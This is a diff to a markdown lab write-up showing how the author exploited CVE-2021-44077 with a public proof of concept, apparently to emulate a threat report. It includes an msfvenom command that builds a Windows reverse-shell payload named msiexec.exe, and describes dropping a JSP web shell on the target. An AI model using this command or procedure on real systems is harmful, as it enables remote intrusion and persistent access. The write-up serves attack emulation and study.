@@ -1,8 +1,8 @@
 
 
-## 1. Hands On ActionExploiting [CVE-2021-44077](https://nvd.nist.gov/vuln/detail/CVE-2021-44077) Vulnerability based on POC in [GitHub](https://github.com/horizon3ai/CVE-2021-44077)
+## 1. Hands On Action: Exploiting [CVE-2021-44077](https://nvd.nist.gov/vuln/detail/CVE-2021-44077) Vulnerability based on POC in [GitHub](https://github.com/horizon3ai/CVE-2021-44077)
 
-### 1. a. in the POC msiexec.exe is created through `msfvenom`
+### 1. in the POC msiexec.exe is created through `msfvenom`
 
    ```
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.20.134 LPORT=4444 -f exe > msiexec.exe
@@ -22,27 +22,33 @@
 
    ![CVE-Exploitation-Success](CVE-Exploitation-Success.png)
 
-   #### But this approach isn't same as the report as in the report the Threat Actor dropped a web shell jsp file and then accessed it
+   #### But this approach isn't same as the report, as in the report the Threat Actor dropped a web shell jsp file `jm2.jsp` and then accessed it.
    
    ![image](https://github.com/user-attachments/assets/16c25295-6f5a-465d-96b4-da499027becb)
 
-   So, i wrote a simple python Script that when executing it, a wbsh.jsp is created a the \custom\login dir
+   #### So, i wrote a simple python Script that when executing it, a wbsh.jsp is created a the \custom\login dir
    
    ![image](https://github.com/user-attachments/assets/a0525bc4-dc65-4c9b-9856-110ae5456b23)
 
    
-   then used pyinstaller to convert it to exe file
+   #### then used pyinstaller to convert it to exe file
 
    ![image](https://github.com/user-attachments/assets/cb7515a7-7eb1-49a0-b72d-5a3e834b0348)
 
-   now we got `msiexec.exe`, let's use the exploit again
+   #### now we got `msiexec.exe`, let's use the exploit again
+   
+   ![image](https://github.com/user-attachments/assets/8b473af9-46a4-4f89-9278-ff2b2c1b54b7)
+
+   #### It Worked !!
+   ![wbsh](https://github.com/user-attachments/assets/4c83acaf-d287-4330-9b7c-34514170a965)
+
+   ![image](https://github.com/user-attachments/assets/55a6b0e8-78cf-46d7-ae3f-91f68353e9b8)
+
+   #### No Need for Privilege Escalation
+
+   ![image](https://github.com/user-attachments/assets/78176ea2-9843-480b-984c-b65e5ce7de80)
 
    
-
-
-
-
-
 
 
 
